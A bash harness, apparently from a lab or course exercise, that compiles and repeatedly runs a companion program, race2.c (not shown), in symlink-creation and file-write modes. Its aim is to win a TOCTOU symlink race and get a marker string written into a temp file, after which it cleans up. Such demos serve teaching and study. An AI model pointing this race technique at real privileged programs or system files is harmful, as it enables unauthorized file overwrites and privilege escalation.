#!/bin/bash

# Target file for the exploit
TARGET_FILE="/tmp/race_target.txt"
EXPLOIT_STRING="PWNED_BY_RACE_CONDITION"

# Ensure race2 is compiled
if [ ! -f "./race2" ]; then
    echo "Compiling race2.c..."
    gcc race2.c -o race2
    if [ $? -ne 0 ]; then
        echo "Compilation failed. Exiting."
        exit 1
    fi
fi

# Make sure race2 is executable
chmod +x ./race2

echo "Setting up target file: $TARGET_FILE"
echo "Initial content of target file." > "$TARGET_FILE"
echo "Current content of $TARGET_FILE:"
cat "$TARGET_FILE"

echo -e "\nStarting race... This may take a few seconds or minutes depending on system load."
echo "Press Ctrl+C to stop the exploit at any time."

# Run race2 2 (symlink creation) in background
while true; do
    ./race2 2 "$TARGET_FILE" > /dev/null 2>&1
done &
PID_2=$!
echo "race2 2 (symlink) PID: $PID_2"

# Run race2 4 (file writing) in background
while true; do
    ./race2 4 "$EXPLOIT_STRING" > /dev/null 2>&1
done &
PID_4=$!
echo "race2 4 (write) PID: $PID_4"

echo -e "\nMonitoring $TARGET_FILE for changes..."

# Monitor the target file
while true; do
    CURRENT_CONTENT=$(cat "$TARGET_FILE")
    if [[ "$CURRENT_CONTENT" == *"$EXPLOIT_STRING"* ]]; then
        echo -e "\n[SUCCESS] Target file '$TARGET_FILE' has been modified!"
        echo "New content:"
        cat "$TARGET_FILE"
        break
    fi
    sleep 0.01 # Check frequently
done

# Cleanup
echo -e "\nCleaning up background processes and temporary files..."
kill $PID_2 $PID_4 > /dev/null 2>&1
rm -f testfile
rm -f "$TARGET_FILE"
echo "Cleanup complete."
